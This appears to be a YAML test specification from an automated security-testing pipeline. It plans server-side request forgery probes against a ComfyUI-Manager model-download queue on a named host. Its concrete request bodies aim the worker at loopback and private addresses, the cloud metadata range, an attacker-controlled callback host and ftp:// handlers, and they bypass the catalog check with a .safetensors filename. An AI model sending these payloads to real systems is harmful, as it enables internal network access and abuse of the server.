@@ -1,0 +1,106 @@
+loop_id: loop-1
+unit_id: Service:model-download
+class: Server-side request forgery (SSRF)
+class_skill: ssrf
+slice:
+  source: trust_agreement
+  statement: "TA4: the worker trusts the queued url to be a fetchable external HTTP resource, and the client is trusted not to aim the fetch at internal network, loopback, or local files. F2 removes every destination policy on the outbound fetch, so the loop opens the destination-and-scheme space the worker will actually speak to: internal address space, arbitrary external origins, and non-HTTP protocol dispatch."
+discrimination:
+  axes_used: [chaining-advanced, payload-vector]
+  boundary: "destination class the unfiltered worker reaches (internal address space / attributable external origin / non-HTTP scheme handler), with the fault fixed at F2; inside the internal class the address-encoding space is the discriminated vector set."
+  narrow_broad_tradeoff: "narrow on destination classes (three classes, one executed proof each) and broad on address encodings inside the internal class; F2 is OBSERVED end-to-end, so class coverage buys more than depth per class."
+specs:
+- spec_id: loop-1-s1
+  label: "internal-address egress read"
+  sub_slice: "Fetches aimed at the unit's own host and at private/link-local ranges (loopback spellings, RFC1918, link-local metadata address): the region where the worker's fetch reaches non-public network space and the assumed 'public content hosts only' contract breaks on its destination-scope clause."
+  class_skill_parametrisation:
+    skill: ssrf
+    inputs: {sink: "worker outbound fetch at queue drain", scheme: "http/https", target_class: internal, anchor: "P28 loopback fetch -> 200, 5 B written into the model tree"}
+  concretisation:
+    protocol: http
+    technology: "ComfyUI-Manager V3.37 worker on aiohttp 3.14.3; unit listens on 46.224.225.245:44177 (same host as the fetcher)"
+    endpoint: "POST /manager/queue/install_model (mirror /api/manager/queue/install_model) then GET /manager/queue/start"
+    parameter: url
+    method: "POST then GET"
+    body: '{"name":"x","url":"http://127.0.0.1:44177/...","filename":"x.safetensors","save_path":"checkpoints"}'
+    headers: {"Content-Type": "application/json"}
+  discrimination_axis: chaining-advanced
+  discrimination_note: "Nearest sibling is loop-1-s2: both prove the unfiltered fetch, but s1 exercises the destination-scope clause (fetch leaves intended public space, lands on non-public addresses) while s2 exercises the attributable-origin region; oracles and violated expectations differ, not just URLs."
+  chaining_advanced_note: "Structural, clause-level discrimination: TA4 is an agreement with separable clauses (fetchable-HTTP clause, internal-network clause, loopback clause, local-file clause); s1 owns the internal-scope clauses. The ssrf skill supplies the address-variant entity (Loopback 127.0.0.1/127.1/2130706433/0x7f000001/::1, RFC1918, link-local 169.254/16), so no skill entity is missing; the reasoning is the clause split, not a skill absence."
+  proxy_technique: "The catalog gate admits internal URLs only through the .safetensors suffix branch (non-catalog URLs give 403 per P22); submitting the internal URL with a lowercase .safetensors filename bypasses the catalog, the item queues with 200, and GET start makes the worker execute the fetch; the loopback response body is written byte-for-byte into the model tree where the listing routes expose its size."
+  verification_symptoms: ["a new model-tree entry (for example under checkpoints/) whose byte size equals the internal target's response size, anchored at 5 B for the loopback manager version read (P28)", "for non-loopback internal targets: a stable differential (arrival timing, response size, error class) against an established unreachable control, per low-noise egress inference"]
+  payload_vector_space:
+    method: "POST /manager/queue/install_model -> GET /manager/queue/start"
+    path: "/manager/queue/install_model, /api/manager/queue/install_model, /manager/queue/start"
+    parameter: "url (filename fixed x.safetensors, save_path checkpoints)"
+    body: 'JSON install item with an internal-address URL'
+    headers: '{"Content-Type":"application/json"}'
+  assumptions: ["the gate admits the internal URL only via the lowercase .safetensors branch (P22/P13 anchoring)", "the worker follows the supplied authority as given after the enqueue response (IA6/DF2)", "the listing routes remain readable as the oracle (IA11)"]
+  rationale: "If F2 is implemented as evidenced (no egress allowlist), the fetch stage has no destination policy; the address-variant family therefore decides whether non-public space is reachable. P28 already executed the loopback leg, so this sub-slice only needs to close the internal address family for coverage."
+  interpretation_guidance: "Symptom-present (loopback) = model-tree entry with size/content matching a known in-unit route response, or the internal service logging the worker request. Symptom-absent = enqueue refused (400/403/405), or 200-queued with no artifact and no internal-side receipt across the whole address family: the destination-scope guard holds, or the egress path was removed. For non-loopback targets a single unreachable host stays inconclusive unless its reachability is established by an independent control; uniform negatives across the family are treated as a held guard, not as a finding."
+- spec_id: loop-1-s2
+  label: "attributable external-origin egress"
+  sub_slice: "Fetches aimed at an attacker-chosen public origin with per-item callback tokens: the region where the worker performs a request whose origin the attacker owns and observes end-to-end, separating worker-side execution from any client-side fetch and enabling the worker to be used as a request generator (blind-SSRF oracle region)."
+  class_skill_parametrisation:
+    skill: ssrf
+    inputs: {sink: "worker outbound fetch at queue drain", scheme: "http/https", target_class: "attacker-controlled external origin", technique: "per-token callback correlation"}
+  concretisation:
+    protocol: http
+    technology: "attacker listener (port 80/443 or high port acc. to URL); worker on aiohttp"
+    endpoint: "POST /manager/queue/install_model then GET /manager/queue/start"
+    parameter: url
+    method: "POST then GET"
+    body: '{"name":"x","url":"http://<attacker-host>/<token>","filename":"x.safetensors","save_path":"checkpoints"}'
+    headers: {"Content-Type": "application/json"}
+  discrimination_axis: payload-vector
+  discrimination_note: "Owns the external-origin region with an attribution oracle: s1 asserts non-public reachability, s2 asserts server-side execution at an attacker origin with one token per item; s3 changes the protocol. The vector is the tokenised callback URL, and the oracle is listener correlation, not a model-tree artifact."
+  chaining_advanced_note: null
+  proxy_technique: "One token per queued item is embedded in the URL path; the listener records each inbound hit with source address, so a hit whose source is the unit (not the inspector machine) attributes the fetch to the worker; the .safetensors branch bypasses the catalog gate so no allowlisted host is required."
+  verification_symptoms: ["exactly one inbound HTTP request per queued item carrying that item's unique token, sourced from the unit host, arriving after the start call", "the fetched body appears byte-for-byte as the model file for the same item when the listener returns a unique marker body"]
+  payload_vector_space:
+    method: "POST install_model -> GET start"
+    path: "/manager/queue/install_model, /manager/queue/start"
+    parameter: "url carrying the per-item token; unique token per queue item"
+    body: 'JSON install item; listener response body is a unique marker'
+    headers: '{} (worker sends its own default headers; none attacker-controlled)'
+  assumptions: ["the queue accepts several items between starts and the worker drains serially (IA12)", "the worker does not require an allowlisted host for .safetensors items (IA3)"]
+  rationale: "With F2 implemented, any host-bearing URL is fetched; the external origin is the only destination where the attacker observes both the request (token) and the response delivery (marker body written). This sub-slice fixes attribution: it separates a real worker fetch from a browser-side fetch and proves the fetch is memoryless per item."
+  interpretation_guidance: "Symptom-present = one token-carrying request per item arrives from the unit's address and the marker body is written as the model file. Symptom-absent = no inbound request for a token while enqueue returned 200, or hits sourced from the tester's own machine or from unrelated scanners: no server-side fetch for that vector (client-side or background traffic is a declared false positive, per the ssrf skill). Uniform absence across tokens closes the egress capability with respect to this oracle; absence with successful in-unit loopback reads only narrows the finding to internal space."
+- spec_id: loop-1-s3
+  label: "non-HTTP scheme dispatch"
+  sub_slice: "Fetches whose URL selects a non-HTTP scheme handler (ftp evidenced at the gate, P30): the region where the worker translates a supplied scheme into a raw protocol conversation instead of a plain web fetch, breaking the fetchable-HTTP-resource clause of TA4."
+  class_skill_parametrisation:
+    skill: ssrf
+    inputs: {sink: "worker outbound fetch", scheme: "ftp (gate-accepted P30); candidate others per handler presence", technique: "handler-presence probing with minimal benign grammar"}
+  concretisation:
+    protocol: "ftp (control connection; candidate: other non-HTTP schemes per handler probing)"
+    technology: "worker fetch client; attacker-controlled FTP listener"
+    endpoint: "POST /manager/queue/install_model then GET /manager/queue/start"
+    parameter: url
+    method: "POST then GET"
+    body: '{"name":"x","url":"ftp://<attacker-host>/x","filename":"x.safetensors","save_path":"checkpoints"}'
+    headers: {"Content-Type": "application/json"}
+  discrimination_axis: chaining-advanced
+  discrimination_note: "Owns the scheme clause, not the destination clause: s1/s2 vary the destination address inside plain HTTP; s3 varies the translation the worker performs on the URL, a different broken expectation (HTTP-resource assumption) with a different oracle (raw protocol conversation, not an HTTP hit)."
+  chaining_advanced_note: "Structural clause split of TA4 continued: clause (1) 'fetchable HTTP resource' fails here while clauses (2)/(3) fail in s1. The ssrf skill supplies the scheme entities (Gopher, File and wrappers, protocol-translating services) and the scheme-translated-command-execution subtopic supplies handler-presence probing with minimal benign grammar; no skill entity is missing, but the target only evidences ftp acceptance (P30), so dispatch itself is the hypothesis under test."
+  proxy_technique: "Minimal benign grammar first: queue an ftp URL pointing at an attacker-controlled FTP listener with a .safetensors filename so the catalog gate is skipped; a plain listener records whether the worker opens the FTP control connection and issues USER/PASS (handler present) or whether the fetch dies before any connection (handler absent)."
+  verification_symptoms: ["FTP control connection from the unit host to the listener recorded at drain time (optionally USER/PASS exchange), proving scheme dispatch", "scheme-conditional error class: gate-accepted ftp URL yields fetch-stage completion or a scheme-specific error distinguishable from an HTTP fetch failure"]
+  payload_vector_space:
+    method: "POST install_model -> GET start"
+    path: "/manager/queue/install_model, /manager/queue/start"
+    parameter: "url scheme selection: ftp:// first (P30-anchored); other candidates (gopher/dict) only as handler probing"
+    body: 'JSON install item with non-HTTP scheme URL'
+    headers: '{"Content-Type":"application/json"}'
+  assumptions: ["'http, https, ftp and file://localhost reach the worker' (DF2) - the ftp leg is the only non-HTTP network scheme evidenced", "the listener can run an FTP control endpoint reachable from the unit"]
+  rationale: "If F2 is implemented with no scheme policy, the URL's scheme selects whichever handler the fetch client enables; ftp already passed the gate (P30), so the remaining question is dispatch. A worker that speaks a raw protocol on attacker request is a different effect region than plain-HTTP SSRF and carries its own impact chain."
+  interpretation_guidance: "Symptom-present = the FTP listener records a control connection sourced from the unit after the drain, with the queued item's corpus; the sub-slice is then confirmed for ftp and handler probing may extend to sibling schemes. Symptom-absent = no control connection while an HTTP control fetch from the same queue cycle succeeds, and the item shows a scheme error: record ftp dispatch as absent and close the scheme region. Gate acceptance alone (200 at enqueue) is not a symptom; do not promote it."
+checks:
+  overlap:
+    status: none
+    notes: "s1 owns non-public address space with artifact/differential oracles; s2 owns attributable external origins with a per-token listener oracle; s3 owns scheme translation with a raw-protocol oracle. Disjoint destination regions, disjoint oracles; none is a payload-string variant of another."
+  coverage:
+    status: exhaustive
+    uncovered: []
+    notes: "The three destination regions the fault opens (internal scope, arbitrary external origin, non-HTTP scheme) are each owned once. Redirect-borne egress and header/method-controlled reads stay outside this loop's slice: the payload shows no redirect-following evidence and no header or method influence on the fetch, so no spec region is left uncovered by exclusion."
+  well_formedness_statement: "Three specs, disjoint destination-class sub-slices, each with a distinct violated clause of TA4 and a distinct oracle; the union covers the destination-and-scheme space F2 opens as far as the payload evidences or directly licenses it. The fault is fixed at F2 in all three, so discrimination rides on the clause/region, and no two specs differ only in a payload string."
+degradations: []
